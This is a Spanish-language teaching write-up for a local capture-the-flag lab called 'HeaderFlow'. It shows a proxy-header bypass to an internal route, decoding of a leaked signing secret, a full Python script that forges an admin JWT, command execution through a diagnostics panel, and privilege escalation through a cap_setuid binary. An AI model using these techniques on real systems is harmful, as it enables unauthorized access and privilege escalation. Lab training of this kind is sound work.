# HeaderFlow - Writeup tecnico docente

## 1. Enumeracion inicial

Abrir la web:

```text
http://127.0.0.1:8083
```

Consultar el endpoint publico:

```powershell
curl http://127.0.0.1:8083/api/status
```

Probar la ruta interna:

```powershell
curl http://127.0.0.1:8083/internal/config
```

La respuesta esperada es `403`. Eso demuestra que la ruta existe, pero el gateway
la bloquea si se accede directamente.

## 2. Bypass por cabecera

Ahora se prueba el bypass. Esta version requiere dos cabeceras porque simula que el
backend no solo confia en una ruta reescrita, sino tambien en un marcador de malla
interna.

```powershell
curl -H "X-Gateway-Mesh: mesh-trusted" -H "X-Original-URL: /internal/config" http://127.0.0.1:8083/api/status
```

La respuesta debe incluir un campo llamado:

```text
signing_material
```

Ese campo no es el secreto en claro. Esta codificado en base64url. La razon es
hacer el laboratorio menos directo: primero se rompe la frontera proxy/backend y
despues se interpreta correctamente el material de firma.

Decodificar el valor:

```powershell
python -c "import base64; v='PEGA_AQUI_SIGNING_MATERIAL'; print(base64.urlsafe_b64decode(v + '=' * (-len(v) % 4)).decode())"
```

El resultado esperado es:

```text
HF_JWT_SECRET_2026
```

Este es el fallo principal: el backend acepta metadatos de proxy que deberian
ser generados solo por la infraestructura interna.

## 3. Forjar JWT admin

Generar un JWT HS256 con rol admin:

```powershell
@'
import base64
import json
import hmac
import hashlib

secret = b"HF_JWT_SECRET_2026"

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "alice", "role": "admin"}

head = b64url(json.dumps(header, separators=(",", ":")).encode())
body = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = hmac.new(secret, f"{head}.{body}".encode(), hashlib.sha256).digest()

print(f"{head}.{body}.{b64url(sig)}")
'@ | python -
```

Copiar el token resultante y pegarlo en:

```text
http://127.0.0.1:8083/admin/login
```

Si el token es correcto, se abre el panel de diagnosticos.

## 4. Obtener user flag

En el panel de diagnosticos no se listan comandos. Debes introducir el diagnostico
manualmente. Para demostrar ejecucion como usuario de servicio, escribe:

```text
cat /home/appsvc/user.txt
```

Resultado esperado:

```text
DL{headerflow_user_admin_execution}
```

## 5. Descubrir capability

Para identificar la capability del binario auxiliar, escribe:

```text
getcap /usr/local/bin/flowctl
```

Resultado esperado:

```text
/usr/local/bin/flowctl cap_setuid=ep
```

## 6. Obtener root flag

Para abusar de esa capability y obtener la evidencia root, escribe:

```text
/usr/local/bin/flowctl root-proof
```

Resultado esperado:

```text
DL{headerflow_root_capability_abuse}
```

Cuando aparece esta flag, la web ofrece la pantalla final con timeline y mapeo
MITRE ATT&CK.
